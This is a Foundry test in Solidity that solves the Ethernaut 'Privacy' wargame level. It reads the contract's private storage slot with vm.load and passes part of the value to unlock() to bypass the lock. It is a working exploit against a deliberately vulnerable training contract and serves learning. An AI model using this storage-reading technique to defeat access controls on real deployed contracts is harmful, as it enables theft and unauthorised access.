// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import { PRBTest } from "@prb/test/PRBTest.sol";
import { console } from "forge-std/console.sol";

import { Ethernaut } from "src/Ethernaut.sol";
import { Privacy } from "src/Privacy/Privacy.sol";
import { PrivacyFactory } from "src/Privacy/PrivacyFactory.sol";

import { toBytes } from "src/utils/toBytes.sol";
import { bytes32ToString } from "src/utils/toString.sol";

contract PrivacyAttackTest is PRBTest {
    Ethernaut public ethernaut;
    PrivacyFactory public factory;
    address public playerAddress = address(0x69);
    address public privacyInstance;

    function setUp() public {
        vm.startPrank(playerAddress);
            ethernaut = new Ethernaut();
            factory = new PrivacyFactory();
            ethernaut.registerLevel(factory);
            privacyInstance = ethernaut.createLevelInstance(factory);
        vm.stopPrank();
    }

    function testPrivacyAttack() public {
        // get the storage slot data that we need (affirmed in PrivacyAttackFork.t.sol)
        bytes32 storageData = vm.load(privacyInstance, bytes32(toBytes(5)));
        // assert that the contract is locked
        bool success = Privacy(privacyInstance).locked() == true;
        assert(success);

        // unlock the contract
        Privacy(privacyInstance).unlock(bytes16(storageData));

        // assert that the contract is unlocked
        success = Privacy(privacyInstance).locked() == false;
        assert(success);

        // assert that the Ethernaut level is complete
        vm.startPrank(playerAddress);
            bool levelComplete = ethernaut.submitLevelInstance(payable(privacyInstance));
            assert(levelComplete);
        vm.stopPrank();       
    }
}